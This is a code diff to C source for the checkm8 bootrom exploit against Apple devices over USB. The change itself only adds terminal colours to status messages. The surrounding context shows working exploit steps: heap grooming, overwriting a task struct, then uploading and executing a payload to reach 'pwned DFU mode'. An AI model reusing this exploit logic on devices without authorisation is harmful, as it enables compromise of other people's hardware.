@@ -78,7 +78,7 @@ int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
 }
 
 int checkm8_exploit(irecv_client_t client) {
-    printf("** exploiting with checkm8\n");
+    printf("\x1b[1m** \x1b[31mexploiting with checkm8\x1b[39;0m\n");
     
     unsigned char buf[0x800] = { 'A' };
     int ret;
@@ -89,7 +89,7 @@ int checkm8_exploit(irecv_client_t client) {
     irecv_device_t device_info = NULL;
     irecv_devices_get_device_by_client(client, &device_info);
     
-    printf("*** based on checkm8 exploit by axi0mX\n");
+    printf("\x1b[1m***\x1b[0m based on checkm8 exploit by axi0mX\n");
     
     ret = get_exploit_configuration(info->cpid, &config);
     if(ret != 0) {
@@ -105,7 +105,7 @@ int checkm8_exploit(irecv_client_t client) {
         return -1;
     }
     
-    printf("Grooming heap\n");
+    printf("\x1b[36mGrooming heap\x1b[39m\n");
     ret = usb_req_stall(client);
     if(ret != IRECV_E_PIPE) {
         printf("Failed to stall pipe.\n");
@@ -135,7 +135,7 @@ int checkm8_exploit(irecv_client_t client) {
     }
     
     
-    printf("Preparing for overwrite\n");
+    printf("\x1b[36mPreparing for overwrite\x1b[39m\n");
     
     int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
     if(sent < 0) {
@@ -168,7 +168,7 @@ int checkm8_exploit(irecv_client_t client) {
         return -1;
     }
     
-    printf("Grooming heap\n");
+    printf("\x1b[36mGrooming heap\x1b[39m\n");
     ret = usb_req_stall(client);
     if(ret != IRECV_E_PIPE) {
         printf("Failed to stall pipe.\n");
@@ -180,7 +180,7 @@ int checkm8_exploit(irecv_client_t client) {
         printf("Failed to create heap hole.\n");
         return -1;
     }
-    printf("Overwriting task struct\n");
+    printf("\x1b[36mOverwriting task struct\x1b[39m\n");
     
     ret = irecv_usb_control_transfer(client, 0, 0, 0, 0, config.overwrite, config.overwrite_len, 100);
     if(ret != IRECV_E_PIPE) {
@@ -188,14 +188,14 @@ int checkm8_exploit(irecv_client_t client) {
         return -1;
     }
     
-    printf("Uploading payload\n");
+    printf("\x1b[36mUploading payload\x1b[39m\n");
     ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, config.payload_len, 100);
     if(ret != IRECV_E_TIMEOUT) {
         printf("Failed to upload payload.\n");
         return -1;
     }
     
-    printf("Executing payload\n");
+    printf("\x1b[36mExecuting payload\x1b[39m\n");
     irecv_reset(client);
     irecv_close(client);
     free(config.payload);
@@ -213,7 +213,7 @@ int checkm8_exploit(irecv_client_t client) {
         printf("Device not in pwned DFU mode.\n");
         return -1;
     }
-    printf("Device is now in pwned DFU mode\n");
+    printf("\x1b[31;1mDevice is now in pwned DFU mode!\x1b[39;0m\n");
     irecv_close(client);
     return 0;
 }
